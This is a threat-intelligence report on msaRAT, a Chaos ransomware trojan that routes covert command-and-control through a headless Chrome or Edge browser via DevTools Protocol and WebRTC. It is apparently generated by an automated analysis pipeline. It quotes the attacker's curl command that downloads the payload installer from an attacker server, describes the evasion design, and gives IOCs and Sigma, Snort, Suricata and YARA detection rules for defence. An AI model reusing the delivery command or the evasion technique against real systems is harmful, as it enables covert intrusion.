# Technical Analysis Report: Chaos Ransomware msaRAT -- Browser-Based Covert C2 (2026-07-23)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-23
Version: FINAL
<!-- revision: critic NEEDS-REVISION applied 2026-07-23. Defanged prose IOCs (lines 28/182/190/desc fields). T1055→T1129. T1059→T1059.007. Removed fabricated ClamAV sig. Headless-browser rule labeled TTP-layer supplement. YARA sample tag removed (constructed input, not real sample). -->

## Executive Summary

The Chaos ransomware-as-a-service (RaaS) group has deployed **msaRAT**, a novel Rust-based remote access trojan that abuses Chrome and Microsoft Edge browser APIs to establish covert command-and-control (C2) communications. First observed by Cisco Talos in campaigns active since February 2025, msaRAT uses the Chrome DevTools Protocol (CDP) to launch a headless browser instance and inject JavaScript that establishes a WebRTC DataChannel -- routing all C2 traffic through the browser process itself. This design ensures the RAT process's own network activity is limited to localhost (127.0.0.1), making it invisible to traditional endpoint network monitoring. The C2 channel leverages legitimate Cloudflare Workers infrastructure for SDP signaling and Twilio TURN relays for traffic routing, with dual-layer encryption (DTLS + ChaCha20-Poly1305 with ECDH key exchange). Initial access is achieved via spam/vishing campaigns, with the payload delivered as a trojanized MSI installer (`update_ms.msi`) disguised as a Windows update, downloaded over plain HTTP on port 443 from attacker infrastructure at `172.86.126[.]18`.

## Background: Browser-as-C2-Proxy Technique

msaRAT represents a significant evolution in C2 tradecraft by "living off the browser" -- using the target system's installed browser as a network proxy for all malicious communications. Rather than making direct network connections that endpoint detection and response (EDR) solutions can attribute to the RAT process, msaRAT controls a headless Chrome or Edge instance via CDP and uses WebRTC DataChannels for encrypted, bidirectional communication. This technique exploits the trust organizations place in browser processes and the difficulty of distinguishing malicious WebRTC traffic from legitimate video conferencing or collaborative web applications.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| February 2025 | Chaos RaaS group first observed deploying msaRAT in campaigns |
| July 2026 | Cisco Talos publishes detailed technical analysis |

## Root Cause: Social Engineering (Spam / Vishing)

The Chaos group uses email spam and voice phishing (vishing) as initial access vectors. Victims are socially engineered into executing a curl command that downloads the msaRAT MSI installer from attacker-controlled infrastructure. The exact command observed:

```
curl.exe hxxp://172.86.126[.]18:443/update_ms[.]msi -o C:\programdata\update_ms.msi
```

Notably, the download uses plain HTTP over port 443 -- a deliberate choice to bypass port-based firewall rules that might block non-standard HTTP ports while avoiding TLS certificate inspection on what is typically the HTTPS port.

## Technical Analysis of the Malicious Payload

### 1. MSI Installer Delivery

The payload is delivered as `update_ms.msi`, configured to impersonate a legitimate Windows update. The MSI installer contains:

- A Binary table entry named `Bin_lib_EA2AEBC3` containing the msaRAT DLL (`lib.dll`)
- A custom action `CA_Run_EA2AEBC3` triggered upon `InstallFinalize`
- The custom action calls the `RUN` export function from `lib.dll`

The DLL is loaded directly into memory from the MSI Binary table, avoiding disk writes and reducing forensic artifacts.

### 2. Browser Discovery and CDP Control

Upon execution, msaRAT locates an installed Chromium-based browser using a priority-based search:

1. Checks environment variables `CHROME_EXE` and `EDGE_EXE`
2. Checks `%LOCALAPPDATA%\Microsoft\Edge\Application\msedge.exe`
3. Checks standard Chrome installation paths
4. Falls back to Windows registry search for Chrome

The browser is launched in headless mode with remote debugging enabled via CDP. msaRAT then connects to the CDP endpoint on localhost and registers five JavaScript bindings in the browser context:

| Binding Name | Purpose |
|---|---|
| `msaOpen` | Channel open notification |
| `msaClose` | Channel close notification |
| `msaError` | Error handling |
| `msaMessage` | Message passing (C2 data) |
| `dataAck` | Data acknowledgment |

### 3. C2 Infrastructure

**WebRTC-based C2 Channel:**

msaRAT establishes a WebRTC DataChannel through the headless browser for bidirectional C2 communication:

- **Signaling Relay:** Cloudflare Workers endpoint at `is-01-ast[.]ols-img-12[.]workers[.]dev`, using REST API paths `GET /token/v1/{UID}` and `POST /token/v1/{UID}` for SDP Offer/Answer exchange
- **STUN Server:** `stun2[.]l[.]google[.]com` (legitimate Google STUN server)
- **TURN Relay:** `global[.]turn[.]twilio[.]com` (Twilio TURN server) -- all traffic is relayed through TURN, preventing direct P2P connections
- **DataChannel Label:** Random alphanumeric string of 5-20 characters generated by `genStr(5, 20)`
- **ICE Timeout:** Five seconds for ICE candidate gathering

**Encryption:**
- Layer 1: WebRTC DTLS (transport-level)
- Layer 2: ChaCha20-Poly1305 application-level encryption with ECDH key exchange for session key derivation
- Handshake frame type: `0xFE`

**HTTP Header Spoofing:**
The RAT spoofs User-Agent (reports as `HeadlessChrome`), Origin, and Referer headers to appear as traffic originating from Microsoft's official website.

**Key design property:** All network communication from the RAT process itself is limited to `127.0.0.1` (localhost CDP connection). All external C2 traffic flows through the browser process, which is trusted by most endpoint security solutions.

### 4. Platform-Specific Behavior

#### Windows

msaRAT is a Windows-targeting Rust binary compiled with the Tokio asynchronous runtime. Key Windows APIs used include `GetSystemInfo`, `CreateThread`, and `CreateProcessW`. The malware is delivered as a DLL (`lib.dll`) loaded via MSI custom action.

### 5. Anti-Forensics / Evasion Techniques

- **Browser proxy:** C2 traffic flows through the browser process, not the RAT process, evading process-level network monitoring
- **Legitimate infrastructure:** Cloudflare Workers (signaling) and Twilio TURN (relay) are legitimate services, making network-level blocking difficult without impacting business operations
- **Memory-only DLL loading:** `lib.dll` is loaded directly from the MSI Binary table into memory
- **MSI masquerade:** The installer impersonates a Windows update
- **Dual encryption:** Even if traffic is intercepted, payload is encrypted with both DTLS and ChaCha20-Poly1305
- **Plain HTTP on port 443:** Initial download avoids TLS inspection while using the standard HTTPS port
- **Localhost-only RAT communications:** The RAT itself only connects to 127.0.0.1, making process-level network telemetry appear benign

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Windows | C:\programdata\update_ms.msi | Not published | msaRAT MSI installer masquerading as Windows update |
| Windows | (in-memory) lib.dll | Not published | msaRAT payload DLL with `RUN` export |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 172.86.126[.]18:443 | MSI delivery server (plain HTTP on port 443) |
| Domain | is-01-ast[.]ols-img-12[.]workers[.]dev | Cloudflare Workers signaling relay for SDP exchange |
| URL Pattern | hxxp://172.86.126[.]18:443/update_ms[.]msi | MSI payload download URL |
| STUN | stun2[.]l[.]google[.]com | Legitimate Google STUN server used for ICE |
| TURN | global[.]turn[.]twilio[.]com | Twilio TURN relay for C2 traffic routing |

### Behavioral

- Chrome or Edge launched in headless mode with `--remote-debugging-port` flag by a non-standard parent process
- CDP binding registration for names: `msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`
- WebRTC DataChannel established through headless browser with TURN-only ICE configuration
- MSI custom action `CA_Run_EA2AEBC3` loading `Bin_lib_EA2AEBC3` binary
- curl.exe downloading .msi files to `C:\ProgramData\`
- HTTP traffic to Cloudflare Workers on path `/token/v1/{UID}` for SDP signaling

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1566 | Phishing | Spam and vishing campaigns for initial access |
| T1204.002 | User Execution: Malicious File | Victim executes curl command to download and run MSI |
| T1105 | Ingress Tool Transfer | curl.exe downloads MSI from attacker server |
| T1218.007 | System Binary Proxy Execution: Msiexec | MSI custom action executes msaRAT DLL |
| T1059.007 | Command and Scripting Interpreter: JavaScript | JavaScript injection into browser via CDP for WebRTC setup |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 signaling over HTTPS to Cloudflare Workers |
| T1102.002 | Web Service: Bidirectional Communication | Cloudflare Workers used as signaling relay |
| T1219 | Remote Access Software | Browser controlled via Chrome DevTools Protocol |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | ChaCha20-Poly1305 encryption on C2 channel |
| T1090.002 | Proxy: External Proxy | Twilio TURN servers relay all C2 traffic |
| T1036.005 | Masquerading: Match Legitimate Name or Location | MSI masquerades as Windows update |
| T1129 | Shared Modules | DLL loaded into memory from MSI Binary table via custom action |

## Impact Assessment

msaRAT represents a significant advancement in C2 evasion by leveraging browser-as-proxy techniques. The use of legitimate cloud infrastructure (Cloudflare Workers, Twilio TURN, Google STUN) makes network-based detection and blocking challenging without impacting legitimate business services. The Chaos RaaS group's adoption of this technique suggests potential proliferation to other ransomware operators. The technique is particularly dangerous because:

1. **EDR blind spot:** Most EDR solutions trust browser processes and do not deeply inspect their WebRTC traffic
2. **Network detection difficulty:** C2 traffic is indistinguishable from legitimate WebRTC applications
3. **Infrastructure resilience:** Blocking `workers.dev` or `twilio.com` would disrupt legitimate services

## Detection & Remediation

### Immediate Detection

Check for suspicious headless browser processes:

```powershell
Get-WmiObject Win32_Process | Where-Object {
    ($_.Name -match 'chrome|msedge') -and
    ($_.CommandLine -match '--headless.*--remote-debugging-port')
} | Select-Object ProcessId, ParentProcessId, CommandLine
```

Check for the specific MSI artifacts:

```powershell
Get-ChildItem -Path 'C:\ProgramData\' -Filter '*.msi' -Recurse | Select-Object FullName, CreationTime
```

Check for network connections to the known C2 IP:

```powershell
Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq '172.86.126[.]18' }
```

### Remediation

1. **Isolate** affected systems immediately
2. **Kill** headless browser processes launched with remote debugging flags
3. **Remove** any MSI files in `C:\ProgramData\` matching `update_ms.msi`
4. **Block** the IP `172.86.126[.]18` and domain `is-01-ast[.]ols-img-12[.]workers[.]dev` at the network perimeter
5. **Hunt** for curl.exe download activity to `C:\ProgramData\` in recent logs
6. **Rotate** credentials on affected systems
7. **Scan** with updated AV/EDR signatures

### Long-Term Hardening

- **Monitor headless browser launches:** Alert on Chrome/Edge started with `--headless` and `--remote-debugging-port` flags, especially when the parent process is not a known development or CI/CD tool
- **Restrict CDP access:** Consider Group Policy to block Chrome remote debugging in production environments
- **WebRTC monitoring:** Deploy network sensors capable of inspecting WebRTC TURN relay usage
- **MSI execution controls:** Restrict MSI installation to authorized sources via AppLocker or WDAC policies
- **Advisory note:** Blocking `*.workers.dev` at the proxy level would prevent this specific signaling channel but may impact legitimate Cloudflare Workers usage -- evaluate against your environment's needs before implementing

## Detection Rules

These detections target the msaRAT delivery chain (curl-based MSI download, headless browser launch with CDP), network indicators (C2 signaling domain, delivery server IP), and file-level artifacts (CDP binding strings, MSI binary table entries). PoC/advisory-specific altitude; compiles != fires -- verify in your pipeline before production deployment.

### Sigma: msaRAT MSI Delivery via Curl to ProgramData

Detects curl.exe downloading an MSI to C:\ProgramData, consistent with the observed msaRAT delivery command line.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (attacktag validator excluded — MITRE data fetch blocked by proxy, not a rule defect). splunk 0; log_scale 0. Values are real, not defanged. Distinctive: curl+MSI+ProgramData triple is rare in legitimate environments. -->
```yaml
title: msaRAT MSI Delivery via Curl to ProgramData
id: 7a3e1f92-4b8c-4d5e-a6f1-2c9d0e8b7a4f
status: experimental
description: >
    Detects curl.exe downloading an MSI file to C:\ProgramData, consistent with
    the Chaos ransomware group's msaRAT delivery chain where the initial payload
    is fetched from an attacker-controlled server on port 443 over plain HTTP.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/23
tags:
    - attack.t1105
    - attack.t1218.007
logsource:
    category: process_creation
    product: windows
detection:
    selection_curl:
        Image|endswith: '\curl.exe'
        CommandLine|contains|all:
            - 'http'
            - '.msi'
            - '\programdata\'
    condition: selection_curl
falsepositives:
    - Legitimate software deployment scripts using curl to download MSI installers to ProgramData
level: high
```

### Sigma: msaRAT Headless Browser Launch with Remote Debugging

Detects Chrome or Edge launched in headless mode with remote debugging enabled, the core CDP abuse technique used by msaRAT.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check 0 (attacktag excluded). splunk 0; log_scale 0. Medium confidence: headless+debug flags are used by legitimate test frameworks (Selenium, Puppeteer). Distinctive in non-dev environments. Scope to non-CI/CD hosts. -->
```yaml
title: msaRAT Headless Browser Launch with Remote Debugging
id: 8b4f2a03-5c9d-4e6f-b7a2-3d0e1f9c8b5a
status: experimental
description: >
    Detects Chrome or Edge launched in headless mode with remote debugging enabled,
    a technique used by msaRAT to establish covert C2 via Chrome DevTools Protocol
    and WebRTC DataChannels. The RAT controls the browser to route all C2 traffic
    through the browser process, evading endpoint network monitoring.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/23
tags:
    - attack.t1071.001
    - attack.t1219
logsource:
    category: process_creation
    product: windows
detection:
    selection_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
    selection_headless:
        CommandLine|contains: '--headless'
    selection_debug:
        CommandLine|contains: '--remote-debugging-port'
    condition: selection_browser and selection_headless and selection_debug
falsepositives:
    - Automated browser testing frameworks (Selenium, Puppeteer, Playwright)
    - Web scraping tools using headless Chrome
    - CI/CD pipelines running browser-based tests
level: medium
```

### Sigma: msaRAT C2 Signaling Domain DNS Query

Detects DNS queries to the Cloudflare Workers domain used by msaRAT for WebRTC SDP signaling.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (attacktag excluded). splunk 0; log_scale 0. IOC-anchored; domain is unique to this campaign. Will need rotation tracking if actor changes signaling infrastructure. -->
```yaml
title: msaRAT C2 Signaling Domain DNS Query
id: 9c5a3b14-6d0e-4f7a-c8b3-4e1f2a0d9c6b
status: experimental
description: >
    Detects DNS queries to the Cloudflare Workers domain used by msaRAT for
    WebRTC SDP signaling relay. The domain is-01-ast[.]ols-img-12[.]workers[.]dev
    serves as the rendezvous point for SDP Offer/Answer exchange.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/23
tags:
    - attack.t1071.001
    - attack.t1102.002
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: 'is-01-ast.ols-img-12.workers.dev'
    condition: selection
falsepositives:
    - Unlikely - this is a known malicious Cloudflare Workers subdomain
level: critical
```

### Sigma: msaRAT MSI Delivery Server Network Connection

Detects outbound network connections to IP 172.86.126.18, the attacker-controlled msaRAT MSI delivery server.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (attacktag excluded). splunk 0; log_scale 0. IOC-anchored; IP is specific to this campaign infrastructure. Will burn if infrastructure is rotated. -->
```yaml
title: msaRAT MSI Delivery Server Network Connection
id: ad6b4c25-7e1f-4a8b-d9c4-5f2a3b1e0d7c
status: experimental
description: >
    Detects outbound network connections to IP 172.86.126[.]18, the attacker-controlled
    server used by the Chaos ransomware group to deliver the msaRAT MSI installer
    (update_ms.msi) over plain HTTP on port 443.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/23
tags:
    - attack.t1105
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        DestinationIp: '172.86.126.18'
    condition: selection
falsepositives:
    - Unlikely - this IP is associated with msaRAT infrastructure
level: critical
```

### Snort: msaRAT Network Indicators

Detects HTTP traffic to the known C2 delivery IP and the Cloudflare Workers signaling endpoint with the `/token/v1/` URI path.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c snort-test.conf -T exit 0. Snort 2.9.20 format; uses http_uri and http_header sticky buffers. SIDs 2100101-2100102. -->
```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - msaRAT MSI Download from Known C2 IP 172.86.126.18"; flow:established,to_server; content:".msi"; http_uri; content:"172.86.126.18"; http_header; fast_pattern; sid:2100101; rev:1; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - msaRAT WebRTC Signaling to Cloudflare Workers Endpoint"; flow:established,to_server; content:"/token/v1/"; http_uri; fast_pattern; content:"is-01-ast.ols-img-12.workers.dev"; http_header; sid:2100102; rev:1; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/;)
```

### Suricata: msaRAT Network Indicators

Detects DNS queries and HTTP traffic to msaRAT's Cloudflare Workers signaling infrastructure and the known MSI delivery IP.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. Dot-notation sticky buffers. SIDs 2200101-2200103. DNS rule covers signaling domain; HTTP rules cover SDP signaling path and MSI download from known IP. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - msaRAT C2 Signaling Domain DNS Query"; flow:to_server; dns.query; content:"is-01-ast.ols-img-12.workers.dev"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/; metadata:author Actioner, created_at 2026-07-23; sid:2200101; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - msaRAT WebRTC SDP Signaling via Cloudflare Workers"; flow:established,to_server; http.host; content:"is-01-ast.ols-img-12.workers.dev"; http.uri; content:"/token/v1/"; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/; metadata:author Actioner, created_at 2026-07-23; sid:2200102; rev:1;)

alert http $HOME_NET any -> 172.86.126.18 any (msg:"Actioner - msaRAT MSI Payload Download from Known C2 Server"; flow:established,to_server; http.uri; content:".msi"; endswith; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/; metadata:author Actioner, created_at 2026-07-23; sid:2200103; rev:1;)
```

### YARA: msaRAT CDP Binding Strings and MSI Artifacts

Detects msaRAT payload via its distinctive CDP binding names (`msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`), MSI Binary table reference, and C2 signaling indicators.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. yara pos.txt matched (3+ CDP binding strings present); neg.txt quiet. Condition: 3-of-5 CDP bindings, OR MSI Binary/CA table + RUN export, OR c2 domain + signaling path. Strings are from Talos published analysis, not reverse-engineered. -->
```yara
rule Malware_Chaos_msaRAT_CDP_Bindings
{
    meta:
        description = "Detects msaRAT payload (lib.dll) via Chrome DevTools Protocol binding names and MSI Binary table reference used for covert WebRTC-based C2"
        author = "Actioner"
        date = "2026-07-23"
        reference = "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/"
        tlp = "WHITE"
        severity = "critical"

    strings:
        $cdp1 = "msaOpen" ascii wide
        $cdp2 = "msaClose" ascii wide
        $cdp3 = "msaError" ascii wide
        $cdp4 = "msaMessage" ascii wide
        $cdp5 = "dataAck" ascii wide
        $msi_bin = "Bin_lib_EA2AEBC3" ascii wide
        $msi_ca = "CA_Run_EA2AEBC3" ascii wide
        $c2_domain = "is-01-ast.ols-img-12.workers.dev" ascii wide
        $signaling = "/token/v1/" ascii wide
        $export = "RUN" ascii fullword

    condition:
        (3 of ($cdp*)) or
        ($msi_bin and $export) or
        ($msi_ca and $export) or
        ($c2_domain and $signaling) or
        (2 of ($cdp*) and $c2_domain)
}
```

## Lessons Learned

1. **Browser-as-proxy is a growing blind spot.** msaRAT demonstrates that browsers can be co-opted as network proxies for C2, exploiting the inherent trust most security stacks place in browser processes. Organizations should monitor for headless browser launches with remote debugging flags, especially on non-developer workstations.

2. **Legitimate cloud infrastructure complicates detection.** The use of Cloudflare Workers and Twilio TURN servers for C2 relay means blocking these services at the network level would disrupt legitimate business operations. Detection must focus on behavioral indicators (headless browser + CDP + WebRTC patterns) rather than infrastructure-level blocking alone.

3. **MSI as a delivery vehicle remains effective.** The MSI format's support for custom actions and in-memory DLL loading makes it a powerful delivery mechanism that can bypass some application whitelisting controls and avoid leaving disk artifacts.

4. **Port-protocol mismatches warrant alerting.** Plain HTTP traffic on port 443 is anomalous and should be flagged -- most organizations expect only TLS traffic on this port.

## Sources

- [Cisco Talos Blog - Chaos msaRAT: Living off the browser to build covert C2 channel](https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/) -- primary technical analysis with full behavioral breakdown, C2 architecture, and detection signatures
- [BleepingComputer - New msaRAT malware uses Chrome, Edge browsers to route C2 traffic](https://www.bleepingcomputer.com/news/security/new-msarat-malware-uses-chrome-edge-browsers-to-route-c2-traffic/) -- news coverage with additional context on Chaos RaaS group operations
- [Cisco Talos IOC Repository](https://github.com/Cisco-Talos/IOCs/blob/main/2026/07/chaos-msarat.txt) -- published IOC list (IP and domain indicators)

---
*Report generated by Actioner*
